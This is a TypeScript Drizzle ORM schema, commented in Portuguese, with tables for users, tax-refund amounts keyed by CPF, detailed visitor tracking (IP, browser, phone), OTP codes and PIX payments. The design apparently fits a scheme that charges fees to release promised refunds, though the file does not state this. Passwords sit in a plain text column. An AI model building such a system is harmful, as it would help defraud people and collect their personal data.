import { pgTable, text, serial, integer, timestamp, boolean, numeric, varchar } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

// Tabela para armazenar valores de restituição por CPF
export const cpfRestituicoes = pgTable("cpf_restituicoes", {
  id: serial("id").primaryKey(),
  cpf: varchar("cpf", { length: 11 }).notNull().unique(),
  valor_restituicao: numeric("valor_restituicao", { precision: 10, scale: 2 }).notNull(),
  data_criacao: text("data_criacao").notNull(), // Armazenado como ISO string
});

export const insertCpfRestituicaoSchema = createInsertSchema(cpfRestituicoes).pick({
  cpf: true,
  valor_restituicao: true,
  data_criacao: true,
});

export type InsertCpfRestituicao = z.infer<typeof insertCpfRestituicaoSchema>;
export type CpfRestituicao = typeof cpfRestituicoes.$inferSelect;

// Tabela para rastreamento de usuários
export const visitantes = pgTable("visitantes", {
  id: serial("id").primaryKey(),
  cpf: varchar("cpf", { length: 11 }).notNull().unique(),
  nome: text("nome"),
  telefone: varchar("telefone", { length: 15 }),
  primeiro_acesso: timestamp("primeiro_acesso").defaultNow().notNull(),
  ultimo_acesso: timestamp("ultimo_acesso").defaultNow().notNull(),
  ip: text("ip"),
  navegador: text("navegador"),
  sistema_operacional: text("sistema_operacional"),
  ultima_pagina_pagamento: text("ultima_pagina_pagamento"), // Guarda a última página de pagamento acessada
  tem_pagamento_pendente: boolean("tem_pagamento_pendente").default(false),
});

export const insertVisitanteSchema = createInsertSchema(visitantes).pick({
  cpf: true,
  nome: true,
  telefone: true,
  ip: true,
  navegador: true,
  sistema_operacional: true,
});

export type InsertVisitante = z.infer<typeof insertVisitanteSchema>;
export type Visitante = typeof visitantes.$inferSelect;

// Tabela para rastreamento de páginas visitadas
export const paginas_visitadas = pgTable("paginas_visitadas", {
  id: serial("id").primaryKey(),
  visitante_id: integer("visitante_id").notNull(),
  url: text("url").notNull(),
  pagina: text("pagina").notNull(), // Nome amigável da página
  timestamp: timestamp("timestamp").defaultNow().notNull(),
  tempo_permanencia: integer("tempo_permanencia"), // Tempo em segundos
  referrer: text("referrer"), // De onde o usuário veio
  dispositivo: text("dispositivo"), // mobile, desktop, tablet
});

export const insertPaginaVisitadaSchema = createInsertSchema(paginas_visitadas).pick({
  visitante_id: true,
  url: true,
  pagina: true,
  referrer: true,
  dispositivo: true,
});

export type InsertPaginaVisitada = z.infer<typeof insertPaginaVisitadaSchema>;
export type PaginaVisitada = typeof paginas_visitadas.$inferSelect;

// Tabela para armazenar códigos OTP para verificação de telefone
export const otp_codigos = pgTable("otp_codigos", {
  id: serial("id").primaryKey(),
  telefone: varchar("telefone", { length: 15 }).notNull(),
  codigo: varchar("codigo", { length: 6 }).notNull(),
  criado_em: timestamp("criado_em").defaultNow().notNull(),
  expira_em: timestamp("expira_em").notNull(),
  usado: boolean("usado").default(false).notNull(),
  cpf: varchar("cpf", { length: 11 }).notNull(),
});

export const insertOtpCodigoSchema = createInsertSchema(otp_codigos).pick({
  telefone: true,
  codigo: true,
  expira_em: true,
  cpf: true,
});

export type InsertOtpCodigo = z.infer<typeof insertOtpCodigoSchema>;
export type OtpCodigo = typeof otp_codigos.$inferSelect;

// Tabela para rastrear pagamentos
export const pagamentos = pgTable("pagamentos", {
  id: serial("id").primaryKey(),
  cpf: varchar("cpf", { length: 11 }).notNull(),
  pagamento_id: text("pagamento_id").notNull(), // ID do pagamento na API For4Payments
  tipo_pagamento: text("tipo_pagamento").notNull(), // "TRE", "TCN", "LAR"
  pagina_pagamento: text("pagina_pagamento").notNull(), // /pagamento, /pagamento-tcn, /pagamento-lar
  status: text("status").notNull(), // pending, paid, expired, cancelled
  valor: numeric("valor", { precision: 10, scale: 2 }).notNull(),
  codigo_pix: text("codigo_pix").notNull(),
  qrcode_pix: text("qrcode_pix").notNull(),
  criado_em: timestamp("criado_em").defaultNow().notNull(),
  expira_em: timestamp("expira_em").notNull(),
  atualizado_em: timestamp("atualizado_em").defaultNow().notNull(),
});

export const insertPagamentoSchema = createInsertSchema(pagamentos).pick({
  cpf: true,
  pagamento_id: true,
  tipo_pagamento: true,
  pagina_pagamento: true,
  status: true,
  valor: true,
  codigo_pix: true,
  qrcode_pix: true,
  expira_em: true,
});

export type InsertPagamento = z.infer<typeof insertPagamentoSchema>;
export type Pagamento = typeof pagamentos.$inferSelect;
